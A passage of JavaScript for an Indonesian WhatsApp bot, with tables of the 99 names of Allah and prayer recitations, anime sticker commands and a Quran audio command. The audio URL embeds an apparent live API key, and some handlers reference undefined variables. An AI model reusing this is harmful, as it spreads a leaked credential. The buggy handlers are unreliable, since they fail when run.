 translation_en: "The Loving, the Kind One"
 },
 {
 index: 48,
 latin: "Al Majiid",
 arabic: "الْمَجِيدُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
 translation_en: "The All Glorious"
 },
 {
 index: 49,
 latin: "Al Baa’its",
 arabic: "الْبَاعِثُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Membangkitkan",
 translation_en: "The Raiser of the Dead"
 },
 {
 index: 50,
 latin: "As Syahiid",
 arabic: "الشَّهِيدُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Menyaksikan",
 translation_en: "The Witness"
 },
 {
 index: 51,
 latin: "Al Haqq",
 arabic: "الْحَقُّ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Benar",
 translation_en: "The Truth, the Real"
 },
 {
 index: 52,
 latin: "Al Wakiil",
 arabic: "الْوَكِيلُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Memelihara",
 translation_en: "The Trustee, the Dependable"
 },
 {
 index: 53,
 latin: "Al Qawiyyu",
 arabic: "الْقَوِيُّ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Kuat",
 translation_en: "The Strong"
 },
 {
 index: 54,
 latin: "Al Matiin",
 arabic: "الْمَتِينُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Kokoh",
 translation_en: "The Firm, the Steadfast"
 },
 {
 index: 55,
 latin: "Al Waliyy",
 arabic: "الْوَلِيُّ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Melindungi",
 translation_en: "The Protecting Friend, Patron, and Helper"
 },
 {
 index: 56,
 latin: "Al Hamiid",
 arabic: "الْحَمِيدُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Terpuji",
 translation_en: "The All Praiseworthy"
 },
 {
 index: 57,
 latin: "Al Mushii",
 arabic: "الْمُحْصِي",
 translation_id: "Yang Memiliki Mutlak sifat Maha Mengkalkulasi",
 translation_en: "The Accounter, the Numberer of All"
 },
 {
 index: 58,
 latin: "Al Mubdi’",
 arabic: "الْمُبْدِئُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Memulai",
 translation_en: "The Producer, Originator, and Initiator of all"
 },
 {
 index: 59,
 latin: "Al Mu’iid",
 arabic: "الْمُعِيدُ",
 translation_id: "Yang Memiliki Mutlak sifat MahaMengembalikan Kehidupan",
 translation_en: "The Reinstater Who Brings Back All"
 },
 {
 index: 60,
 latin: "Al Muhyii",
 arabic: "الْمُحْيِي",
 translation_id: "Yang Memiliki Mutlak sifat Maha Menghidupkan",
 translation_en: "The Giver of Life"
 },
 {
 index: 61,
 latin: "Al Mumiitu",
 arabic: "اَلْمُمِيتُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Mematikan",
 translation_en: "The Bringer of Death, the Destroyer"
 },
 {
 index: 62,
 latin: "Al Hayyu",
 arabic: "الْحَيُّ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Hidup",
 translation_en: "The Ever Living"
 },
 {
 index: 63,
 latin: "Al Qayyuum",
 arabic: "الْقَيُّومُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Mandiri",
 translation_en: "The Self Subsisting Sustainer of All"
 },
 {
 index: 64,
 latin: "Al Waajid",
 arabic: "الْوَاجِدُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Penemu",
 translation_en: "The Perceiver, the Finder, the Unfailing"
 },
 {
 index: 65,
 latin: "Al Maajid",
 arabic: "الْمَاجِدُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
 translation_en: "The Illustrious, the Magnificent"
 },
 {
 index: 66,
 latin: "Al Wahiid",
 arabic: "الْواحِدُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Tunggal",
 translation_en: "The One, The Unique, Manifestation of Unity"
 },
 {
 index: 67,
 latin: "Al ‘Ahad",
 arabic: "اَلاَحَدُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Esa",
 translation_en: "The One, the All Inclusive, the Indivisible"
 },
 {
 index: 68,
 latin: "As Shamad",
 arabic: "الصَّمَدُ",
 translation_id: "Yang Memiliki Mutlak sifat MahaDibutuhkan, Tempat Meminta",
 translation_en: "The Self Sufficient, the Impregnable,the Eternally Besought of All, the Everlasting"
 },
 {
 index: 69,
 latin: "Al Qaadir",
 arabic: "الْقَادِرُ",
 translation_id: "Yang Memiliki Mutlak sifat MahaMenentukan, Maha Menyeimbangkan",
 translation_en: "The All Able"
 },
 {
 index: 70,
 latin: "Al Muqtadir",
 arabic: "الْمُقْتَدِرُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Berkuasa",
 translation_en: "The All Determiner, the Dominant"
 },
 {
 index: 71,
 latin: "Al Muqaddim",
 arabic: "الْمُقَدِّمُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Mendahulukan",
 translation_en: "The Expediter, He who brings forward"
 },
 {
 index: 72,
 latin: "Al Mu’akkhir",
 arabic: "الْمُؤَخِّرُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Mengakhirkan",
 translation_en: "The Delayer, He who puts far away"
 },
 {
 index: 73,
 latin: "Al Awwal",
 arabic: "الأوَّلُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Awal",
 translation_en: "The First"
 },
 {
 index: 74,
 latin: "Al Aakhir",
 arabic: "الآخِرُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Akhir",
 translation_en: "The Last"
 },
 {
 index: 75,
 latin: "Az Zhaahir",
 arabic: "الظَّاهِرُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Nyata",
 translation_en: "The Manifest; the All Victorious"
 },
 {
 index: 76,
 latin: "Al Baathin",
 arabic: "الْبَاطِنُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Ghaib",
 translation_en: "The Hidden; the All Encompassing"
 },
 {
 index: 77,
 latin: "Al Waali",
 arabic: "الْوَالِي",
 translation_id: "Yang Memiliki Mutlak sifat Maha Memerintah",
 translation_en: "The Patron"
 },
 {
 index: 78,
 latin: "Al Muta’aalii",
 arabic: "الْمُتَعَالِي",
 translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
 translation_en: "The Self Exalted"
 },
 {
 index: 79,
 latin: "Al Barri",
 arabic: "الْبَرُّ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Penderma",
 translation_en: "The Most Kind and Righteous"
 },
 {
 index: 80,
 latin: "At Tawwaab",
 arabic: "التَّوَابُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Penerima Tobat",
 translation_en: "The Ever Returning, Ever Relenting"
 },
 {
 index: 81,
 latin: "Al Muntaqim",
 arabic: "الْمُنْتَقِمُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Penuntut Balas",
 translation_en: "The Avenger"
 },
 {
 index: 82,
 latin: "Al Afuww",
 arabic: "العَفُوُّ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Pemaaf",
 translation_en: "The Pardoner, the Effacer of Sins"
 },
 {
 index: 83,
 latin: "Ar Ra`uuf",
 arabic: "الرَّؤُوفُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Pengasih",
 translation_en: "The Compassionate, the All Pitying"
 },
 {
 index: 84,
 latin: "Malikul Mulk",
 arabic: "مَالِكُ الْمُلْكِ",
 translation_id: "Yang Memiliki Mutlak sifatPenguasa Kerajaan (Semesta)",
 translation_en: "The Owner of All Sovereignty"
 },
 {
 index: 85,
 latin: "Dzul JalaaliWal Ikraam",
 arabic: "ذُوالْجَلاَلِوَالإكْرَامِ",
 translation_id: "Yang Memiliki Mutlak sifat PemilikKebesaran dan Kemuliaan",
 translation_en: "The Lord of Majesty and Generosity"
 },
 {
 index: 86,
 latin: "Al Muqsith",
 arabic: "الْمُقْسِطُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
 translation_en: "The Equitable, the Requiter"
 },
 {
 index: 87,
 latin: "Al Jamii’",
 arabic: "الْجَامِعُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Mengumpulkan",
 translation_en: "The Gatherer, the Unifier"
 },
 {
 index: 88,
 latin: "Al Ghaniyy",
 arabic: "الْغَنِيُّ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Berkecukupan",
 translation_en: "The All Rich, the Independent"
 },
 {
 index: 89,
 latin: "Al Mughnii",
 arabic: "الْمُغْنِي",
 translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Kekayaan",
 translation_en: "The Enricher, the Emancipator"
 },
 {
 index: 90,
 latin: "Al Maani",
 arabic: "اَلْمَانِعُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Mencegah",
 translation_en: "The Withholder, the Shielder, the Defender"
 },
 {
 index: 91,
 latin: "Ad Dhaar",
 arabic: "الضَّارَّ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Derita",
 translation_en: "The Distressor, the Harmer"
 },
 {
 index: 92,
 latin: "An Nafii’",
 arabic: "النَّافِعُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Manfaat",
 translation_en: "The Propitious, the Benefactor"
 },
 {
 index: 93,
 latin: "An Nuur",
 arabic: "النُّورُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Bercahaya(Menerangi, Memberi Cahaya)",
 translation_en: "The Light"
 },
 {
 index: 94,
 latin: "Al Haadii",
 arabic: "الْهَادِي",
 translation_id: "Yang Memiliki Mutlak sifat Maha Pemberi Petunjuk",
 translation_en: "The Guide"
 },
 {
 index: 95,
 latin: "Al Baadii",
 arabic: "الْبَدِيعُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Pencipta",
 translation_en: "Incomparable, the Originator"
 },
 {
 index: 96,
 latin: "Al Baaqii",
 arabic: "اَلْبَاقِي",
 translation_id: "Yang Memiliki Mutlak sifat Maha Kekal",
 translation_en: "The Ever Enduring and Immutable"
 },
 {
 index: 97,
 latin: "Al Waarits",
 arabic: "الْوَارِثُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Pewaris",
 translation_en: "The Heir, the Inheritor of All"
 },
 {
 index: 98,
 latin: "Ar Rasyiid",
 arabic: "الرَّشِيدُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Pandai",
 translation_en: "The Guide, Infallible Teacher, and Knower"
 },
 {
 index: 99,
 latin: "As Shabuur",
 arabic: "الصَّبُورُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Sabar",
 translation_en: "The Patient"
 }
]
 let json = JSON.parse(JSON.stringify(asmaulhusna))
 let data = json.map((v, i) => `${i + 1}. ${v.latin}\n${v.arabic}\n${v.translation_id}`).join('\n\n')
 if (isNaN(args[0])) return reply (`contoh:\nasmaulhusna 1`)
 if (args[0]) {
 if (args[0] < 1 || args[0] > 99) throw `minimal 1 & maksimal 99!`
 let { index, latin, arabic, translation_id, translation_en } = json.find(v => v.index == args[0].replace(/[^0-9]/g, ''))
 return reply(`No. ${index}
${arabic}
${latin}
${translation_id}
${translation_en}
`.trim())
 }
 Reply(`${contoh} + ${data} + ${anjuran}`)
}
break

case 'stickhandhold': {
axios.get(`https://api.waifu.pics/sfw/handhold`)
.then(({data}) => {
Ditss.sendAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
//D|ts si pler 🐎
break 
case 'stickshinobu': {
axios.get(`https://api.waifu.pics/sfw/shinobu`)
.then(({data}) => {
Ditss.sendAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
//D|ts si pler 🐎
break 
case 'stickhighfive': {
axios.get(`https://api.waifu.pics/sfw/highfive`)
.then(({data}) => {
Ditss.sendAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
//D|ts si pler 🐎
break 
case 'stickcuddle': {
axios.get(`https://api.waifu.pics/sfw/cuddle`)
.then(({data}) => {
Ditss.sendAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
//D|ts si pler 🐎
break 
case 'stickcringe': {
axios.get(`https://api.waifu.pics/sfw/cringe`)
.then(({data}) => {
Ditss.sendAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
//D|ts si pler 🐎
break 
case 'stickdance': {
axios.get(`https://api.waifu.pics/sfw/dance`)
.then(({data}) => {
Ditss.sendAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
//D|ts si pler 🐎
break 
case 'stickhappy': {
axios.get(`https://api.waifu.pics/sfw/happy`)
.then(({data}) => {
Ditss.sendAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
//D|ts si pler 🐎
break 
case 'stickglomp': {
axios.get(`https://api.waifu.pics/sfw/glomp`)
.then(({data}) => {
Ditss.sendAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
//D|ts si pler 🐎
break 
case 'sticksmug': {
axios.get(`https://api.waifu.pics/sfw/smug`)
.then(({data}) => {
Ditss.sendAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
//D|ts si pler 🐎
break 
case 'stickblush': {
axios.get(`https://api.waifu.pics/sfw/blush`)
.then(({data}) => {
Ditss.sendAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
//D|ts si pler 🐎
break 
case 'stickawoo': {
axios.get(`https://api.waifu.pics/sfw/awoo`)
.then(({data}) => {
Ditss.sendAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
//D|ts si pler 🐎
break 
case 'stickwave': {
axios.get(`https://api.waifu.pics/sfw/wave`)
.then(({data}) => {
Ditss.sendAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
//D|ts si pler 🐎
break 
case 'sticksmile': {
axios.get(`https://api.waifu.pics/sfw/smile`)
.then(({data}) => {
Ditss.sendAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
//D|ts si pler 🐎
break 
case 'stickslap': {
axios.get(`https://api.waifu.pics/sfw/slap`)
.then(({data}) => {
Ditss.sendAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
//D|ts si pler 🐎
break 
case 'sticknom': {
axios.get(`https://api.waifu.pics/sfw/nom`)
.then(({data}) => {
Ditss.sendAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
//D|ts si pler 🐎
break 
case 'stickpoke': {
axios.get(`https://api.waifu.pics/sfw/poke`)
.then(({data}) => {
Ditss.sendAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
//D|ts si pler 🐎
break 
case 'stickwink': {
axios.get(`https://api.waifu.pics/sfw/wink`)
.then(({data}) => {
Ditss.sendAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
//D|ts si pler 🐎
break 
case 'stickbonk': {
axios.get(`https://api.waifu.pics/sfw/bonk`)
.then(({data}) => {
Ditss.sendAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
//D|ts si pler 🐎
break 
case 'stickbully': {
axios.get(`https://api.waifu.pics/sfw/bully`)
.then(({data}) => {
Ditss.sendAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
//D|ts si pler 🐎
break 
case 'stickyeet': {
axios.get(`https://api.waifu.pics/sfw/yeet`)
.then(({data}) => {
Ditss.sendAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
//D|ts si pler 🐎
break 
case 'stickbite': {
axios.get(`https://api.waifu.pics/sfw/bite`)
.then(({data}) => {
Ditss.sendAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
//D|ts si pler 🐎
break 
case 'stickkiss': {
axios.get(`https://api.waifu.pics/sfw/kiss`)
.then(({data}) => {
Ditss.sendAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
//D|ts si pler 🐎
break 
case 'sticklick': {
axios.get(`https://api.waifu.pics/sfw/lick`)
.then(({data}) => {
Ditss.sendAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
//D|ts si pler 🐎
break 
case 'stickpat': {
axios.get(`https://api.waifu.pics/sfw/pat`)
.then(({data}) => {
Ditss.sendAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
//D|ts si pler 🐎
break 
case 'stickhug': {
axios.get(`https://api.waifu.pics/sfw/hug`)
.then(({data}) => {
Ditss.sendAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
//D|ts si pler 🐎
break 
case 'stickkill': {
axios.get(`https://api.waifu.pics/sfw/kill`)
.then(({data}) => {
Ditss.sendAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
//D|ts si pler 🐎
break 
case 'stickcry': {
axios.get(`https://api.waifu.pics/sfw/cry`)
.then(({data}) => {
Ditss.sendAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
//D|ts si pler 🐎
break 
case 'stickspank':{
                axios.get(`https://nekos.life/api/v2/img/spank`)
.then(({data}) => {
Ditss.sendAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
//D|ts si pler 🐎
break 
case 'sticktickle':{
                axios.get(`https://nekos.life/api/v2/img/tickle`)
.then(({data}) => {
Ditss.sendAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
//D|ts si pler 🐎
break 


case 'bacaansholat': {
const bacaanshalat = {
 "result": [
 {
 "id": 1,
 "name": "Bacaan Iftitah",
 "arabic": "اللَّهُ أَكْبَرُ كَبِيرًا وَالْحَمْدُ لِلَّهِ كَثِيرًا وَسُبْحَانَ اللَّهِ بُكْرَةً وَأَصِيلاً , إِنِّى وَجَّهْتُ وَجْهِىَ لِلَّذِى فَطَرَ السَّمَوَاتِ وَالأَرْضَ حَنِيفًا وَمَا أَنَا مِنَ الْمُشْرِكِينَ إِنَّ صَلاَتِى وَنُسُكِى وَمَحْيَاىَ وَمَمَاتِى لِلَّهِ رَبِّ الْعَالَمِينَ لاَ شَرِيكَ لَهُ وَبِذَلِكَ أُمِرْتُ وَأَنَا أَوَّلُ الْمُسْلِمِينَ",
 "latin": "Alloohu akbar kabiirow wal hamdu lillaahi katsiiroo wasubhaanalloohi bukrotaw wa-ashiilaa, Innii wajjahtu wajhiya lilladzii fathoros samaawaati wal ardlo haniifaa wamaa ana minal musyrikiin. Inna sholaatii wa nusukii wamahyaa wa mamaatii lillaahi robbil &lsquo;aalamiin. Laa syariikalahu wa bidzaalika umirtu wa ana awwalul muslimiin",
 "terjemahan": "Allah Maha Besar dengan sebesar-besarnya, segala puji bagi Allah dengan pujian yang banyak. Mahasuci Allah pada waktu pagi dan petang, Sesungguhnya aku hadapkan wajahku kepada Allah yang telah menciptakan langit dan bumi dalam keadaan tunduk dan aku bukanlah dari golongan orang-orang musyrik. Sesungguhnya shalatku, sembelihanku, hidupku dan matiku hanya untuk Allah Tuhan semesta alam. Tidak ada sekutu bagiNya. Dan dengan yang demikian itu lah aku diperintahkan. Dan aku adalah orang yang pertama berserah diri"
 },
 {
 "id": 2,
 "name": "Al Fatihah",
 "arabic": "بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ ﴿١﴾الْحَمْدُ لِلَّـهِ رَبِّ الْعَالَمِينَ ﴿٢﴾ الرَّحْمَـٰنِ الرَّحِيمِ ﴿٣﴾ مَالِكِ يَوْمِ الدِّينِ ﴿٤﴾ إِيَّاكَ نَعْبُدُ وَإِيَّاكَ نَسْتَعِينُ ﴿٥﴾ اهْدِنَا الصِّرَاطَ الْمُسْتَقِيمَ ﴿٦﴾ صِرَاطَ الَّذِينَ أَنْعَمْتَ عَلَيْهِمْ غَيْرِ الْمَغْضُوبِ عَلَيْهِمْ وَلَا الضَّالِّينَ ﴿٧",
 "latin": "1. Bismillahirrahmanirrahim, 2. Alhamdulillahi rabbil alamin, 3. Arrahmaanirrahiim, 4. Maaliki yaumiddiin, 5. Iyyaka nabudu waiyyaaka nastaiin, 6. Ihdinashirratal mustaqim, 7. shiratalladzina an&rsquo;amta alaihim ghairil maghduubi alaihim waladhaalin",
 "terjemahan": "1. Dengan menyebut nama Allah Yang Maha Pemurah lagi Maha Penyayang, 2. Segala puji bagi Allah, Tuhan semesta alam, 3. Maha Pemurah lagi Maha Penyayang, 4. Yang menguasai di Hari Pembalasan, 5. Hanya Engkaulah yang kami sembah, dan hanya kepada Engkaulah kami meminta pertolongan, 6. Tunjukilah kami jalan yang lurus, 7. (yaitu) Jalan orang-orang yang telah Engkau beri nikmat kepada mereka; bukan (jalan) mereka yang dimurkai dan bukan (pula jalan) mereka yang sesat"
 },
 {
 "id": 3,
 "name": "Bacaan Ruku",
 "arabic": "(3x) سُبْحَانَ رَبِّيَ الْعَظِيْمِ وَبِحَمْدِهِ",
 "latin": "Subhana Rabbiyal Adzimi Wabihamdih (3x)",
 "terjemahan": "Maha Suci Tuhanku Yang Maha Agung Dan Dengan Memuji-Nya"
 },
 {
 "id": 4,
 "name": "Bacaan Sujud",
 "arabic": "(3x) سُبْحَانَ رَبِّىَ الْأَعْلَى وَبِحَمْدِهِ",
 "latin": "Subhaana robbiyal a'la wabihamdih (3x)",
 "terjemahan": "Mahasuci Tuhanku yang Mahatinggi dan segala puji bagiNya"
 },
 {
 "id": 5,
 "name": "Bacaan Duduk Diantara Dua Sujud",
 "arabic": "رَبِّ اغْفِرْلِيْ وَارْحَمْنِيْ وَاجْبُرْنِيْ وَارْفَعْنِيْ وَارْزُقْنِيْ وَاهْدِنِيْ وَعَافِنِيْ وَاعْفُ عَنِّيْ",
 "latin": "Rabbighfirli Warhamni Wajburnii Warfaknii Wazuqnii Wahdinii Wa'aafinii Wa'fuannii",
 "terjemahan": "Ya Allah,ampunilah dosaku,belas kasihinilah aku dan cukuplah segala kekuranganku da angkatlah derajatku dan berilah rezeki kepadaku,dan berilah aku petunjuk dan berilah kesehatan padaku dan berilah ampunan kepadaku"
 },
 {
 "id": 6,
 "name": "Duduk Tasyahud Awal",
 "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ",
 "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahummasholli ala Sayyidina Muhammad",
 "terjemahan": "Segala penghormatan, keberkahan, shalawat dan kebaikan hanya bagi Allah. Semoga salam sejahtera selalu tercurahkan kepadamu wahai Nabi, demikian pula rahmat Allah dan berkahNya dan semoga salam sejahtera selalu tercurah kepada kami dan hamba-hamba Allah yang shalih. Aku bersaksi bahwa tiada ilah kecuali Allah dan aku bersaksi bahwa Muhammad adalah utusan Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad"
 },
 {
 "id": 7,
 "name": "Duduk Tasyahud Akhir",
 "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ، كَمَا صَلَّيْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ وَبَارِكْ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ كَمَا بَرَكْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ فِى الْعَالَمِيْنَ إِنَّكَ حَمِيْدٌ مَجِيْدٌ",
 "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahumma Shalli Ala Sayyidina Muhammad Wa Ala Ali Sayyidina Muhammad. Kama Shollaita Ala Sayyidina Ibrahim wa alaa aali sayyidina Ibrahim, wabaarik ala Sayyidina Muhammad Wa Alaa Ali Sayyidina Muhammad, Kama barokta alaa Sayyidina Ibrahim wa alaa ali Sayyidina Ibrahim, Fil aalamiina innaka hamiidummajid",
 "terjemahan": "Segala penghormatan yang berkat solat yang baik adalah untuk Allah. Sejahtera atas engkau wahai Nabi dan rahmat Allah serta keberkatannya. Sejahtera ke atas kami dan atas hamba-hamba Allah yang soleh. Aku bersaksi bahwa tiada Tuhan melainkan Allah dan aku bersaksi bahwasanya Muhammad itu adalah pesuruh Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad dan ke atas keluarganya. Sebagaimana Engkau selawatkan ke atas Ibrahim dan atas keluarga Ibrahim. Berkatilah ke atas Muhammad dan atas keluarganya sebagaimana Engkau berkati ke atas Ibrahim dan atas keluarga Ibrahim di dalam alam ini. Sesungguhnya Engkau Maha Terpuji lagi Maha Agung"
 },
 {
 "id": 8,
 "name": "Salam",
 "arabic": "اَلسَّلاَمُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ",
 "latin": "Assalamualaikum Warohmatullahi Wabarokatuh",
 "terjemahan": "Semoga keselamatan, rohmat dan berkah ALLAH selalu tercurah untuk kamu sekalian."
 }
 ]
}
 let bacaan = JSON.stringify(bacaanshalat)
 let json = JSON.parse(bacaan)
 let data = json.result.map((v, i) => `${i + 1}. ${v.name}\n${v.arabic}\n${v.latin}\n*Artinya:*\n_"${v.terjemahan}"_`).join('\n\n')
 let contoh = `*「 Bacaan Shalat 」*\n\n`
 Reply(`${contoh} + ${data}`)
}
break



case 'audiosurah': {
	let wrong = `_*Contoh Penggunaan :*_\naudiosurah 1

*List Surah :*
1 : Al-Fatihah
2 : Al-Baqarah
3 : Ali 'Imran
4 : An-Nisa'
5 : Al-Ma'idah
6 : Al-An'am
7 : Al-A’raf
8 : Al-Anfal
9 : At-Taubah
10 : Yunus
11 : Hud
12 : Yusuf
13 : Ar-Ra’d
14 : Ibrahim
15 : Al-Hijr
16 : An-Nahl
17 : Al-Isra'
18 : Al-Kahf
19 : Maryam
20 : Ta Ha
21 : Al-Anbiya
22 : Al-Hajj
23 : Al-Mu’minun
24 : An-Nur
25 : Al-Furqan
26 : Asy-Syu'ara'
27 : An-Naml
28 : Al-Qasas
29 : Al-'Ankabut
30 : Ar-Rum
31 : Luqman
32 : As-Sajdah
33 : Al-Ahzab
34 : Saba’
35 : Fatir
36 : Ya Sin
37 : As-Saffat
38 : Sad
39 : Az-Zumar
40 : Ghafir
41 : Fussilat
42 : Asy-Syura
43 : Az-Zukhruf
44 : Ad-Dukhan
45 : Al-Jasiyah
46 : Al-Ahqaf
47 : Muhammad
48 : Al-Fath
49 : Al-Hujurat
50 : Qaf
51 : Az-Zariyat
52 : At-Tur
53 : An-Najm
54 : Al-Qamar
55 : Ar-Rahman
56 : Al-Waqi’ah
57 : Al-Hadid
58 : Al-Mujadilah
59 : Al-Hasyr
60 : Al-Mumtahanah
61 : As-Saff
62 : Al-Jumu’ah
63 : Al-Munafiqun
64 : At-Tagabun
65 : At-Talaq
66 : At-Tahrim
67 : Al-Mulk
68 : Al-Qalam
69 : Al-Haqqah
70 : Al-Ma’arij
71 : Nuh
72 : Al-Jinn
73 : Al-Muzzammil
74 : Al-Muddassir
75 : Al-Qiyamah
76 : Al-Insan
77 : Al-Mursalat
78 : An-Naba’
79 : An-Nazi’at
80 : 'Abasa
81 : At-Takwir
82 : Al-Infitar
83 : Al-Tatfif
84 : Al-Insyiqaq
85 : Al-Buruj
86 : At-Tariq
87 : Al-A’la
88 : Al-Gasyiyah
89 : Al-Fajr
90 : Al-Balad
91 : Asy-Syams
92 : Al-Lail
93 : Ad-Duha
94 : Al-Insyirah
95 : At-Tin
96 : Al-'Alaq
97 : Al-Qadr
98 : Al-Bayyinah
99 : Az-Zalzalah
100 : Al-'Adiyat
101 : Al-Qari'ah
102 : At-Takasur
103 : Al-'Asr
104 : Al-Humazah
105 : Al-Fil
106 : Quraisy
107 : Al-Ma’un
108 : Al-Kausar
109 : Al-Kafirun
110 : An-Nasr
111 : Al-Lahab
112 : Al-Ikhlas
113 : Al-Falaq
114 : An-Nas`
 if (!text) return reply(`${wrong}`)
 Ditss.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
 Ditss.sendMessage(m.chat, { audio: { url: `https://api.lolhuman.xyz/api/quran/audio/${text}?apikey=efcb180d3fd3134748648887` }, mimetype: 'audio/mp4' }, { quoted: m });

}
break



case 'ayatkursi': {
 let caption = `
*「 Ayat Kursi 」*
